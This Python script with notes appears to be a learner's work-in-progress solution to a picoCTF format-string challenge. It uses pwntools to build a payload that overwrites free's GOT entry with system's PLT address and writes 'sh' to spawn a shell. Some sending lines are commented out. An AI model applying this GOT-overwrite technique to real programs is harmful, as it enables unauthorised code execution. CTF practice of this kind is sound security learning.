# Solution
# 
# Partial RELRO is set, so should be able to perform a GOT overwrite
# Similar to the stonks challenge, this challenge is vulnerable to a format string attack


# 602038 <- address for the got.plt function
#   should set the value located there to the thunk function for system
# 0x602038 => 20306000_00000000 => 00000000_00603020
#   set to => 18306000_00000000 <= 00000000_00603018
# 
# Ez enough
# Set 0x602038 0x20 => 0x18

# Maybe try to overwrite rip to point to plt?

"""
Things learned:
- Don't pigeon hole yourself to an idea, try to rapid test the idea, then come up with new ideas
- Think about your exploit primitives and their full capabilities
  - "I have the ability to write whatever values I want to pointers on the stack"
  - Think how can you upgrade, or can you write multiple values to them
  - I really need to get better at C
"""

# https://stackoverflow.com/questions/6322540/how-do-positional-arguments-like-1-work-with-printf
# - says that it requires all leading aruments from first to nth are specified in the format string? so maybe this was what was messing up my string?

# Sometimes you just need to go to the sourcecode
# called positionals
# https://github.com/bminor/glibc/blob/master/stdio-common/vfprintf-internal.c#L1118
# Looks like it calls the printf_positional if there is a positional, which just grabs all of the other positional arguments and saves them, then executes the printf function like normal, with the positional arguments resolved, also seems to parse the format specifiers as well

import pwn
from time import sleep
from format_string import FormatString

def test_payload():
  """ Just a test payload, so I dont have to multi-line comment
      """
  payload = b'%20$p-' + b'%p' * 100
  return payload

def attach_gdb(proc):
  """ So I can comment out gdb when I need it
      """
  pwn.gdb.attach(proc, gdbscript="""
    break *0x00400ac9
    break buy_stonks
    c

  """)
  sleep(1)

def main():
  pwn.context.arch = 'amd64'
  pwn.context.binary = './vuln'
  pwn.context.terminal = ['gnome-terminal', '-x', 'sh', '-c']

  #proc = pwn.remote('mercury.picoctf.net', 38163)
  proc = pwn.process()
  #attach_gdb(proc)

  # 12th position, there is a pointer to the stack that we should be able to write over
  got_free = 0x602018
  plt_system = 0x4006f6

  formatter = FormatString()

  # Create a pointer to free
  formatter.build_payload(0, got_free, 12)
  format_string = formatter.format_specifier

  # Overwrite free and point to system
  formatter.build_payload(0, plt_system, 20)


  # c6 -> f6
  remainder = 0x602018 % 256
  increment = 0xf6 - remainder

  formatstuff = str(increment)

  format_string = '%c'*10 + f'%{got_free-10}c%n'

  format_string += f'%{formatstuff}c%20$hhn'

  payload = format_string.encode('utf-8')

  total = got_free + increment
  total = 0x6020f6

  sh = b'sh\x00\x01'
  formatstuff = int.from_bytes(sh, 'little') - total
  
  #format_string += f'%18$n'
  format_string += f'%{formatstuff}c%18$n'
  print(format_string)
  
  payload = format_string.encode('utf-8')
  #payload = test_payload()

  # Should be able to write "sh" to the stack since there is a pointer on the stack that free uses

  #proc.sendlineafter(b'2) View my portfolio', b'1')
  #proc.sendlineafter(b'What is your API token?', payload)

  #proc.interactive()

if __name__ == '__main__':
  main()
